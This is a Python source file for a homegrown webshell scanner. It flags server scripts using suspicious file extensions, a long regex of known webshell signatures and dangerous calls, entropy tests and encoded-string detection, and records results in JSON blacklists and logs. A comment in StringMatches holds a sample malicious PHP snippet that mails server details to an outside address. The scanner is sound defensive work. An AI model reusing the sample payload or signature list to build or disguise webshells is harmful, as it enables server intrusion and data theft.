import base64
import datetime
import getpass
import gzip
import hashlib
import json
import math
import os
import platform
import re
import socket
import sys
import time
import zipfile
import configparser
import psutil
import threading
import numpy as np
from collections import Counter
from zipfile import ZipFile
from multiprocessing.pool import ThreadPool as Pool


# from smb.SMBConnection import SMBConnection


# TESTED AND WORKED
def GetAllFiles(dir_path, size, ext):
    if os.path.isdir(dir_path):
        file_list = []
        for root, dirs, files in os.walk(dir_path):
            for file in files:
                file_size = os.path.getsize(root + "/" + file)
                if file_size > size:
                    continue

                # ext_list = ext.split("|")
                # for e in ext_list:
                #     if e in file:
                #         append the file name to the list
                #         file_list.append(os.path.join(root, file))
                #         break
                file_list.append(os.path.join(root, file))
        return file_list
    else:
        print("Wrong path input. Exit.")

# TESTED AND WORKED


def ScanExtension(file_name):
    # Input Sample
    #file_name = "Ajan.asp.txt"

    file_matches = {}  # a dict
    r1 = "[^a-zA-Z0-9\-\_\.]{2,}"
    r2 = re.compile("\.[a-zA-Z0-9]{2,4}\.")
    r3 = "\.php|\.asp|\.aspx|\.sh|\.bash|\.zsh|\.csh|\.tsch|\.pl|\.py|\.cgi|\.cfm|\.jsp|\.htaccess|\.ashx|\.vbs"
    matches = re.findall(r1, file_name)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    matches = re.findall(r2, file_name)
    if len(matches) > 0:
        for i in matches:
            matches_t = re.findall(r3, i)
            if len(matches_t) > 0:
                count_dict = dict(Counter(matches).items())
                file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED


def StringMatches(file_data):
    # Input Sample
    # file_data = "<?php include(\"config.php\");db_connect();header('Content-Type: application/octetstream');header('Content-Disposition: filename=\"linksbox_v2.sql\"');$ra44 = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$sd98=\"john.barker446@gmail.com\";$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = \"$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65\";mail($sd98, $sj98, $msg8873, \"From: $sd98\"); header('Pragma: no-cache');header('Expires: 0'); $data .= \"#phpMyAdmin MySQL-Dump \r\n\"; $data .=\"# http://phpwizard.net/phpMyAdmin/ \r\n\"; $data .=\"# http://www.phpmyadmin.net/(download page) \r\n\"; $data .= \"#$database v2.0 Database Backup\r\n\"; $data .= \"#Host: $server\r\n\"; $data .= \"#Database: $database\r\n\r\n\"; $data .= \"#Table add_links:\r\n\";$result = mysql_query(\"SELECT * FROM add_links\");while($a = mysql_fetch_array($result)) { foreach($a as $key => $value) { $a[$key] = addslashes($a[$key]); } $data .= \"INSERT INTO add_links VALUES('0','$a[link]', '$a[description]', '$a[tooltip]', '$a[hits]'); \r\n#endquery\r\n\"; } echo $data; ?>"

    file_matches = {}
    r = re.compile(regex)
    matches = re.findall(r, file_data)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED


def EntropyMatches(file_data):
    # Input Sample
    # file_h = open("test_entropy.txt", "r")
    # file_data = file_h.read()

    file_matches = {}
    entropy = 0.0
    if len(file_data) < 20*1024:
        return file_matches, 0
    file_data = file_data.replace(" ", "")
    for i in range(256):  # Scan all 256 character in ASCII
        count = float(file_data.count(chr(i)))
        length = float(len(file_data))
        pX = count / length
        if pX > 0.00:
            entropy = entropy + (-pX * math.log(pX, 2))
    if entropy > 7.4:
        file_matches["Entropy"] = int(entropy*10)
    return file_matches, entropy

# TESTED AND WORKED, BUT NOT SURE


def CompressMatches(file_data):
    file_matches = {}
    if len(file_data) < 20*1024:
        return file_matches
    compressed = gzip.compress(bytes(file_data, 'utf-8'))
    raw = gzip.decompress(compressed)
    ratio = len(compressed) / len(raw)
    if ratio > 0.74:
        file_matches["Compress"] = int(ratio * 100)
    return file_matches

# TESTED, NEARLY CORRECT =)))


def SplitMatches(file_data):
    file_matches = {}
    s = "eval|file_put_contents|base64_decode|base64|python_eval|exec|passthru|popen|proc_open|pcntl|assert|system|shell|uncompress|cmd.exe|execute|escapeshellcmd|os.popen|/bin/sh|/bin/bash|create_function|executionpolicybypass"
    split_list = s.split("|")
    result = "|"
    for i in split_list:
        result = result + i[::-1] + "|"
    reg = s + result
    reg = reg.replace("_", "\_")
    reg = reg.replace(".", "\.")
    reg = reg.replace("/", "\/")
    r = re.compile(reg)
    r1 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r2 = re.compile(r"[^\w\/]")
    matches1 = re.findall(r1, file_data)
    s1 = ""
    if len(matches1) > 0:
        for i in matches1:
            s1 = s1 + i
    s1 = re.sub(pattern=r2, string=s1, repl="")
    matchesr1 = re.findall(r, s1.lower())
    if len(matchesr1) > 0:
        count_dict = dict(Counter(matchesr1).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED


def Base64Matches(file_data):
    # Correct Input Sample
    # file_h = open("test_base64.txt", "r")
    # file_data = file_h.read()

    file_matches = {}
    r3 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r4 = re.compile(r"[^\w\/=+]")
    matches1 = re.findall(r3, file_data)
    s1 = ""
    if len(matches1) > 0:
        for it in matches1:
            s1 = re.sub(pattern=r4, string=it, repl="")
            r = re.compile(
                "^(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?$")
            r1 = re.compile("[a-fA-F0-9]+")
            r2 = re.compile("[a-zA-Z0-9\/]+")
            matches = re.findall(r, s1)
            if len(matches) > 0:
                for it1 in matches:
                    matchesit1 = re.findall(r1, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    matchesit1 = re.findall(r2, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    file_matches[it1] = len(it1)
    return file_matches

# TESTED AND WORKED


def Base32Matches(file_data):
    file_matches = {}
    r3 = re.compile(r"(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r4 = re.compile(r"[^\w\/=+]")
    matches1 = re.findall(r3, file_data)
    s1 = ""
    if len(matches1) > 0:
        for it in matches1:
            s1 = re.sub(pattern=r4, string=it, repl="")
            r = re.compile(
                "^(?:[A-Z2-7]{8})*(?:[A-Z2-7]{2}={6}|[A-Z2-7]{4}={4}|[A-Z2-7]{5}={3}|[A-Z2-7]{7}=)?$")
            r1 = re.compile("[a-fA-F0-9]+")
            r2 = re.compile("[a-zA-Z0-9\/]+")
            matches = re.findall(r, s1)
            if len(matches) > 0:
                for it1 in matches:
                    matchesit1 = re.findall(r1, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    matchesit1 = re.findall(r2, it1)
                    for k in matchesit1:
                        if len(k) == len(it1)-2:
                            continue
                    file_matches[it1] = len(it1)
    return file_matches

# TESTED AND WORKED


def HexStringMatches(file_data):
    file_matches = {}
    r = re.compile(r"(?:(?:\\x[0-9A-Fa-f]{2})+)")
    matches = re.findall(r, file_data)
    if len(matches) > 0:
        count_dict = dict(Counter(matches).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED


def LongStringMatches(file_data):
    file_matches = {}
    if len(file_data) < 20*1024:
        return file_matches
    r = re.compile("(?:\'[^\']*\')|(?:\"[^\"]*\")")
    r1 = re.compile("[a-zA-Z0-9\+\/\=]")
    matches = re.findall(r, file_data)
    matches_result = []
    if len(matches) > 0:
        for it in matches:
            if len(it) < 64:
                continue
            matchesx = re.findall(r1, it)
            for x in matchesx:
                if len(x) == len(it)-2:
                    continue
            matches_result.append(it)
        count_dict = dict(Counter(matches_result).items())
        file_matches.update(count_dict)
    return file_matches

# TESTED AND WORKED


def ProcessMatches(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    total_file_matches = {}  # a dictionary
    file_matches = {}  # dict
    scan_info = ""
    count = 0

    try:
        file_handle = open(file)
    except:
        return total_file_matches, 0, "", 0

    file_size = os.stat(file).st_size
    file_name = os.path.basename(file)
    # Scan Extension
    file_matches = ScanExtension(file_name)

    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + "TRUE"
        count = count + 1
    scan_info = scan_info + ","
    try:
        file_data = file_handle.read()
    except:
        return total_file_matches, file_size, "", 0

    # CONFUSED HERE!!!!!!!!!!!
    # cmtR = "\/\/.*|\/\*.*?\*\/|[^\u0000-\u007f]+" # RANGE OF UNICODE IN PYTHON ONLY HAVE 1 \, NOT 2
    cmtR = "[^\u0000-\u007f]+"  # TEMPORARY REGEX.

    matches = re.findall(pattern=cmtR, string=file_data)
    file_data = re.sub(pattern=cmtR, string=file_data, repl="")
    cmtR = re.compile("[\s\n\r\t]+")
    matches = re.findall(pattern=cmtR, string=file_data)
    file_data = re.sub(pattern=cmtR, string=file_data, repl=" ")
    file_data = file_data.replace("  ", " ")
    file_data = file_data.replace(" (", "(")
    codeR = re.compile(
        r"<\?php(?:.*?)\?>|<script(?:.*?)<\/script>|<%(?:.*?)%>")
    matches = re.findall(pattern=codeR, string=file_data)
    if len(matches) > 0:
        file_data = ""
        for i in matches:
            file_data = file_data + i
    else:
        return total_file_matches, 0, "", 0

    # String Matches
    file_matches = StringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Entropy Matches and Calculate Entropy
    file_matches, entropy = EntropyMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update({"Entropy": file_matches["Entropy"]})
        scan_info = scan_info + str(total_file_matches["Entropy"])
        count = count + 1
    scan_info = scan_info + ","

    # Compress Matches
    file_matches = CompressMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update({"Compress": file_matches["Compress"]})
        scan_info = scan_info + str(total_file_matches["Compress"])
        count = count + 1
    scan_info = scan_info + ","

    # Split Matches
    file_matches = SplitMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Base64 Matches
    file_matches = Base64Matches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Base32 Matches
    file_matches = Base32Matches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Hex String Matches
    file_matches = HexStringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    scan_info = scan_info + ","

    # Long String Matches
    file_matches = LongStringMatches(file_data)
    if len(file_matches) > 0:
        total_file_matches.update(file_matches)
        scan_info = scan_info + str(len(file_matches))
        count = count + 1
    match_log = file + "," + scan_info.replace(" ", "")
    if count > 0:
        return total_file_matches, file_size, match_log, entropy
    file_handle.close()
    return total_file_matches, file_size, "", entropy

# TESTED AND WORKED


def MD5HashFile(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    file_handle = open(file, "rb")
    file_data = file_handle.read()
    result = hashlib.md5(file_data).hexdigest()
    return result


def SHA256HashFile(file):
    # Input Sample
    # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

    file_handle = open(file, "rb")
    file_data = file_handle.read()
    result = hashlib.sha256(file_data).hexdigest()
    return result

def write_json(data, filename):
    with open(filename,'w') as f:
        json.dump(data, f)


def ScanFunc(file_list, output_dir, scan_dir, start_time):
    matched = 0
    cleared = 0
    totalFilesScanned = 0

    # lock = threading.Lock()

    # Scan file-by-file in file list
    for file in file_list:
        if file == None:
            return
        # Sample
        # file = "C:\\Users\\namlh21\\Downloads\\webshell-master\\138shell\\C\\ctt_sh.php.txt"

        file_name = os.path.basename(file)

        # Hash of file
        file_md5 = MD5HashFile(file)
        file_sha256 = SHA256HashFile(file)

        # Process Matches
        file_matches, size, match_log, entropy = ProcessMatches(file)

        # Process match_log: match_header = "PathName,Extension,String,Entropy,Compress,Split,Base64,Base32,HexString,LongString,Size,MD5,Created,Modified,Accessed\n"
        match_list = match_log.split(",")

        if len(match_list) != 10:
            match_list = [""] * 10

        # Scanned database
        try:
            # lock.acquire()
            db_handle = open("database.json") # EDIT HOW TO OPEN DATABASE HERE
            db_handle.close()  
            # lock.release()
        except FileNotFoundError:
            # lock.acquire()
            db_handle = open("database.json", "a")
            # Define new json db
            db_json = {}
            blacklist = {}
            whitelist = {}
            db_json.update({"blacklist": blacklist})
            db_json.update({"whitelist": whitelist})
            db_json_string = json.dumps(db_json)
            db_handle.write(db_json_string)
            db_handle.close()
            # lock.release()
        # lock.acquire()
        db_handle = open("database.json", "r")
        db_content = db_handle.read()
        db_handle.close()
        # lock.release()
        if file_sha256 in db_content:
            print("File: " + file + ": Already scan")
            continue
        else:
            print(file)
            totalFilesScanned = totalFilesScanned + 1
            if (len(file_matches) > 0 and size > 0):
                matched = matched + 1
                # lock.acquire()
                db_handle = open("database.json", "r")
                db_json = json.load(db_handle)
                db_handle.close()
                blacklist = db_json['blacklist']
                blacklist.update({file_name: file_sha256})
                db_handle = open("database.json", "w")
                json.dump(db_json, db_handle)
                db_handle.close()
                
            else:
                cleared = cleared + 1
                # lock.acquire()
                db_handle = open("database.json", "r")
                db_json = json.load(db_handle)
                db_handle.close()
                whitelist = db_json['whitelist']
                whitelist.update({file_name: file_sha256})
                db_handle = open("database.json", "w")
                json.dump(db_json, db_handle)
                db_handle.close()
                continue
        db_handle.close()
        # lock.release()
        
        # Get created time
        if platform.system() == 'Windows':
            create_time = os.path.getctime(file)
            create_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(create_time))
            modify_time = os.path.getmtime(file)
            modify_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(modify_time))
            access_time = os.path.getatime(file)
            access_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(access_time))
        else:  # NOT TESTED
            stat = os.stat(file)
            create_time = stat.st_ctime  # We're probably on Linux.
            create_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(create_time))
            modify_time = stat.st_mtime
            modify_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(modify_time))
            access_time = stat.st_atime
            access_time = time.strftime(
                '%Y-%m-%d %H:%M:%S', time.localtime(access_time))

        # JSON output
        json_data = {}
        json_data.update({"filePath": file})
        json_data.update({"size": str(size)})
        json_data.update({"md5": file_md5})
        json_data.update({"sha256": file_sha256})

        timestamps = {}
        timestamps.update({"created": create_time})
        timestamps.update({"modified": modify_time})
        timestamps.update({"accessed": access_time})
        json_data.update({"timestamps": timestamps})

        signature = {}
        signature.update({"extension": match_list[1]})
        signature.update({"string": match_list[2]})
        signature.update({"entropy": match_list[3]})
        signature.update({"compress": match_list[4]})
        signature.update({"split": match_list[5]})
        signature.update({"base64": match_list[6]})
        signature.update({"base32": match_list[7]})
        signature.update({"hexstring": match_list[8]})
        signature.update({"longstring": match_list[9]})
        json_data.update({"signature": signature})

        json_data.update({"matches": file_matches})
        json_data.update({"entropy": entropy})
        json_data_string = json.dumps(json_data)

        output_json_path = output_dir + "/log.json"
        # lock.acquire()
        output_json_handle = open(output_json_path, "a")
        output_json_handle.write(json_data_string + "\n")
        output_json_handle.close()
        # lock.release()

    # Write scan debug info to debug.json
    stop_time = time.time()
    scan_time = stop_time - start_time
    WriteDebugInfo(totalFilesScanned, matched, cleared, scan_dir, scan_time, output_dir)

def WriteDebugInfo(totalFilesScanned, matched, cleared, scan_dir, scan_time, output_dir):
    # lock = threading.Lock()

    hostname = socket.gethostname()
    user_name = getpass.getuser()
    homedir = os.path.expanduser("~")
    pid = os.getpid()
    process = psutil.Process(pid)
    
    scan_data = {}
    scan_data.update({"scanned": str(totalFilesScanned)})
    scan_data.update({"matches": str(matched)})
    scan_data.update({"noMatches": str(cleared)})
    scan_data.update({"directory": str(scan_dir)})

    system_info = {}
    system_info.update({"cpu_percent": str(process.cpu_percent())})
    system_info.update({"mem_usage": str(round(float(process.memory_info()[0]/1024),2))}) # in KB
    system_info.update({"mem_percent": str(process.memory_percent())})
    system_info.update({"hostname": str(hostname)})
    system_info.update({"username": user_name})
    system_info.update({"userHomeDir": homedir})
    scan_data.update({"systemInfo": system_info})

    scan_data.update({"scanDuration": str(scan_time)})
    scan_data_string = json.dumps(scan_data)
    output_json_path = output_dir + "/debug.json"
    # lock.acquire()
    output_json_handle = open(output_json_path, "a")
    output_json_handle.write(scan_data_string + "\n")
    output_json_handle.close()
    # lock.release()

def chunk_based_on_number(lst, chunk_numbers):
    n = math.ceil(len(lst)/chunk_numbers)

    for x in range(0, len(lst), n):
        each_chunk = lst[x: n+x]

        if len(each_chunk) < n:
            each_chunk = each_chunk + [None for y in range(n-len(each_chunk))]
        yield each_chunk

# Main program
start_time = time.time()
print("Webshell Scan Program")

try:
    config_handle = open("config.conf", "r")
except:
    print("Cannot find config file. Exit.")
    exit()

parser = configparser.ConfigParser()
parser.read("config.conf")
scan_dir = parser.get("config", "dir")
crontab = parser.get("config", "crontab")
size = parser.get("config", "size")
ext = parser.get("config", "ext")
if size == 0 or size == "":
    size = 10*1024*1024
else:
    size = int(size) * 1024 * 1024
if ext == "":
    ext = ".php|.asp|.aspx|.sh|.bash|.zsh|.csh|.tsch|.pl|.py|.cgi|.cfm|.jsp|.htaccess|.ashx|.vbs|.ps1|.war|.js|.jar"

# IMPORTANT!!! ALL REGEX ON THIS PROGRAM NEED TO USE NON-CAPTURING GROUP
regex = r"Filesman|(?:@\$_\[\]=|\$_=@\$_GET|\$_\[\+\"\"\]=)|eval\(\$(?:\w|\d)|Load\(Request\.BinaryRead\(int\.Parse\(Request\.Cookies|Html \= Replace\(Html\, \"\%26raquo\;\"\, \"?\"\)|pinkok|internal class reDuh|c0derz shell|md5 cracker|umer rock|Function CP\(S\,D\)\{sf\=CreateObject\(\"java\"\,\"java\.io\.File|Arguments\=xcmd\.text|asp cmd shell|Maceo|TEXTAREA id\=TEXTAREA1 name\=SqlQuery|CMD Bilgileri|sbusqlmod|php assert\(\$\_POST\[|oWshShellNet\.UserName|PHP C0nsole|rhtools|WinX Shell|system\(\$\_GET\[\'cmd\'|Successfully uploadet|\'Are you sure delete|sbusqlcmd|CFSWITCH EXPRESSION\=\#Form\.chopper|php\\HFile|\"ws\"\+\"cr\"\+\"ipt\.s\"\+\"hell\"|eval\(request\(|string rootkey|uZE Shell|Copyed success\!|InStr\(\"\$rar\$mdb\$zip\$exe\$com\$ico\$\"|Folder dosen\'t exists|Buradan Dosya Upload|echo passthru\(\$\_GET\[\'cmd\'|javascript:Bin\_PostBack|The file you want Downloadable|arguments\=\"/c \#cmd\#\"|cmdshell|AvFBP8k9CDlSP79lDl|AK-74 Security Team Web Shell|cfexecute name \= \"\#Form\.cmd\#\"|execute\(|Gamma Web Shell|System\.Reflection\.Assembly\.Load\(Request\.BinaryRead\(int\.Parse\(Request\.Cookies|fcreateshell|bash to execute a stack overflow|Safe Mode Shell|ASPX Shell|dingen\.php|azrailphp|\$\_POST\[\'sa\']\(\$\_POST\[\'sb\']\)|AspSpy|ntdaddy|\.HitU\. team|National Cracker Crew|eval\(base64\_decode\(\$\_REQUEST\[\'comment\'|Rootshell|geshi\\tsql\.php|tuifei\.asp|GRP WebShell|No Permission :\(|powered by zehir|will be delete all|WebFileManager Browsing|Dive Shell|diez\=server\.urlencode|@eval\(\$\_POST\[\'|ifupload\=\"ItsOk\"|eval\(request\.item|\(eval request\(|wsshn\.username|connect to reDuh|eval\(gzinflate\(base64\_decode|Ru24PostWebShell|ASPXTOOL\"|aspshell|File upload successfully you can download here|eval request\(|if\(is\_uploaded\_file\(\$HTTP|Sub RunSQLCMD|STNC WebShell|doosib|WinExec\(Target\_copy\_of\_cmd|php passthru\(getenv|win\.com cmd\.exe /c cacls\.exe|TUM HAKLARI SAKLIDIR|Created by PowerDream|Then Request\.Files\(0\)\.SaveAs\(Server\.MapPath\(Request|cfmshell|\{ Request\.Files\[0]\.SaveAs\(Server\.MapPath\(Request|\%execute\(request\(\"|php eval\(\$\_POST\[|lama\'s\'hell|RHTOOLS|data\=request\(\"dama\"|digitalapocalypse|hackingway\.tk|\.htaccess stealth web shell|strDat\.IndexOf\(\"EXEC \"|ExecuteGlobal request\(|Deleted file have finished|bin\_filern|CurrentVersionRunBackdoor|Chr\(124\)\.O\.Chr\(124\)|does not have permission to execute CMD\.EXE|G-Security Webshell|system\( \"\./findsock|configwizard|textarea style\=\"width:600\;height:200\" name\=\"cmd\"|ASPShell|repair/sam|BypasS Command eXecute|\%execute\(request\(|arguments\=\"/c \#hotmail|Coded by Loader|Call oS\.Run\(\"win\.com cmd\.exe|DESERTSUN SERVER CRASHER|ASPXSpy|cfparam name\=\"form\.shellpath\"|IIS Spy Using ADSI|p4ssw0rD|WARNING: Failed to daemonise|C0mmand line|phpinfo\(\) function has non-permissible|letaksekarang|Execute Shell Command|DXGLOBALSHIT|IISSpy|execute request\(|Chmod Ok\!|Upload Gagal|awen asp\.net|execute\(request\(\"|oSNet\.ComputerName|aspencodedll\.aspcoding|vbscript\.encode|exec\(|shell\_exec\(|popen\(|system\(|escapeshellcmd|passthru\(|pcntl\_exec|proc\_open|db\_connect|mysql\_query|execl\(|cmd\.exe|os\.popen|ls\ \-la|\/etc\/passwd|\/etc\/hosts|adodb\.connection|sqlcommandquery|shellexecute|oledbcommand|mime\-version|exif\_read\_data\(|gethostbyname\(|create\_function\(|base64\_decode\(|\-executionpolicy\ bypass"

# Get All File
file_list = GetAllFiles(scan_dir, size, ext)

# Check valid regex and ext
try:
    re.compile(ext)
    re.compile(regex)
except:
    print('Non valid regex input. Exit')
    exit()

# Define output
os_name = platform.node()
user_name = getpass.getuser()
domain_name = socket.getfqdn()
ip_addr = socket.gethostbyname(socket.gethostname())
scan_time = str(datetime.datetime.today().strftime('%Y-%m-%d-%H-%M'))

output_dir = os_name + "_" + scan_time
os.mkdir(output_dir)
output_zip = domain_name + "_" + ip_addr + "_" + \
    os.path.basename(scan_dir) + "_" + scan_time + ".zip"

# ScanFunc
# pool_size = 5
# pool = Pool(pool_size)
# for files in file_list:
#     pool.apply_async(ScanFunc, (files, output_dir, scan_dir, start_time))
# pool.close()
# pool.join()

# Multi Threading
# file_list_2 = list(chunk_based_on_number(file_list, chunk_numbers=2))
# t1 = threading.Thread(target=ScanFunc, args=(file_list_2[0], output_dir, scan_dir, start_time))
# t2 = threading.Thread(target=ScanFunc, args=(file_list_2[1], output_dir, scan_dir, start_time))
# t1.start()
# t2.start()
# t1.join()
# t2.join()


ScanFunc(file_list, output_dir, scan_dir, start_time)

# Zip JSON output
with ZipFile(output_dir + "/" + output_zip, 'w', compression=zipfile.ZIP_DEFLATED) as zip:
    zip.write(output_dir + "/log.json",
              os.path.basename(output_dir + "/log.json"))
print("File zip successful.")

# Save file to log server

# if platform.system() == "Windows":
#     net_folder = r"\\10.111.177.41\Logs$"
#     output_zip_path = net_folder + "\\" + output_zip
#     output_zip_handle = open(output_zip_path, "ab")
#     with open(output_dir + "/" + output_zip, 'rb') as f:
#         zip_data = f.read()
#     output_zip_handle.write(zip_data)
#     output_zip_handle.close()
# elif platform.system() == "Linux":
#     # WRITING
#     exit()

print("Scan done! Without threading")
